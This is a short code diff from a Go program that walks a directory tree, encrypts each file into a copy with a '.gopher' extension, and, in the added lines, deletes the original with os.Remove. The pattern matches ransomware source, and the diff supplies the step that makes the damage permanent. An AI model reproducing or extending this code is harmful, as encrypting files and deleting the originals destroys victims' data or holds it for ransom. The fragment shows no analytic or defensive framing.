@@ -202,7 +202,10 @@ func main() {
 
 		fmt.Println(path, info.Size())
 		encryptFile(path, path+".gopher", key)
-		// TODO: destroy original file
+
+		// Destroy original file
+		os.Remove(path)
+
 		return nil
 	})
 }
